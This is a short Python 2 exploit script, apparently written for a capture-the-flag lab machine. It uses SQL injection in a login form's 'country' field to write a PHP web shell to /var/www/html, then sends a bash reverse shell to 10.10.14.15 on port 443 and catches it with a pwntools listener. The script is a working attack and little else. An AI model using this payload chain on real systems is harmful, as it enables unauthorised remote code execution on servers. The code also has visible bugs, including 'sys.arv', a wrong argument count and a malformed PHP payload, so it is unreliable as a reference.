#!/usr/bin/python2
import sys

from pwn import *
import signal, pdb, requests

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Control+C
signal.signal(signal.SIGINT,def_handler)

# If calling doesn't have 2 args show use label
if len(sys.argv)!=2:
    log.failure("Use: %s <ip_address> filename" % sys.argv[0])
    sys.exit(1)

# Variables_Globales
ip_address = sys.arv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 443

#Remote file creation
def createfile():
    #Data_post with SQL Injection
    #SQL Injection abuse PHP request with RCE creating param CMD
    data_post={
        'username':'admin',
        'country': """Mexico' union select "<?php system($_REQUEST['cmd'];?>" into outputfile "/var/www/html/exploit.php"-- -"""
    }

    #Send Post Request with data_post to remote create file
    r = requests.post(main_url, data=data_post)

def getAccess():

    #Data_post with CMD running a reverse shell
    data_post={
        'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'"
    }

    #Send Post Request_Reverse_Shell Execution
    r = requests.post(main_url + "%s" % filename,data=data_post)

if __name__ == '__main__':
    createfile()
    try:
        #Parallel execution with threads
        threading.Thread(target=getAccess,args=()).start()
    except Exception as e:
        log.error(str(e))

    #Invoke a Shell
    #Listen on local port until you get a Shell
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()